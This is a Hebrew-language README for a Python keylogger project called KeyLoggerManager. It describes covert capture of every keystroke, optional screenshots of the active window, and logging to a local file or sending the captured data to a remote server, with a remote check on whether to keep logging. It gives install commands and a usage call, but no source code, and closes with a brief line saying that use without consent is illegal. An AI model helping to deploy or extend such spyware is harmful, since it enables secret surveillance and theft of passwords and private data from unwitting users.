# KeyLogger-Project

מנהל מקלדת מוסתרת (KeyLoggerManager)

סקירה כללית

KeyLoggerManager הוא מנהל מקלדת מוסתרת מבוסס Python, המאפשר לכידה של הקשות מקלדת, צילום מסך אופציונלי, ורישום נתונים לקובץ מקומי או שליחתם לרשת לשרת מוגדר מראש.

תכונות

מעקב אחרי הקשות מקלדת: לוכד את כל קלטי המקלדת.

צילום מסך: אפשרות לצילום מסכים של החלון הפעיל.

שמירת נתונים לקובץ: שמירת נתונים שנאספו לקובץ מקומי.

שליחת נתונים לרשת: העברת נתונים לשרת מרוחק.

בדיקת סטטוס: אימות מול השרת אם יש להמשיך ברישום הנתונים.

תלות

הפרויקט דורש את ספריות ה-Python הבאות:

requests

pygetwindow

keyboard

getmac

ניתן להתקין את התלויות באמצעות הפקודה הבאה:

pip install requests pygetwindow keyboard getmac

שימוש

הפעלת KeyLoggerManager

כדי להתחיל להשתמש במנהל המקלדת, יש לשנות את server_link לכתובת השרת הרצויה ולהריץ את הסקריפט:

server_link = "http://127.0.0.1:5000"
KeyLoggerManager(server_link, if_screenshot=False, file_write=False, network_write=True).main()

אפשרויות תצורה

server_link: כתובת השרת לשליחת הנתונים.

if_screenshot: הפעלה או השבתה של צילום מסכים (ברירת מחדל: True).

file_write: הפעלה או השבתה של רישום נתונים לקובץ (ברירת מחדל: False).

network_write: הפעלה או השבתה של שליחת נתונים לרשת (ברירת מחדל: True).

רכיבים

KeyLoggerManager

אחראי על ניהול פעולות המקלדת המוסתרת, כולל רישום, כתיבה לקובץ, שליחת נתונים לרשת וצילום מסכים.

KeyloggerService

מטפל בפועל ברישום הקשות מקלדת ובצילום מסכים.

FileWriter

כותב את הנתונים שנאספו לקובץ מקומי.

NetworkWrite

שולח את הנתונים שנאספו לשרת מרוחק.

שיקולי אבטחה

השימוש במקלדת מוסתרת ללא הסכמה מפורשת הוא בלתי חוקי ובלתי מוסרי. ודא שיש לך הרשאה לפני הפעלת תוכנה זו.

רישוי
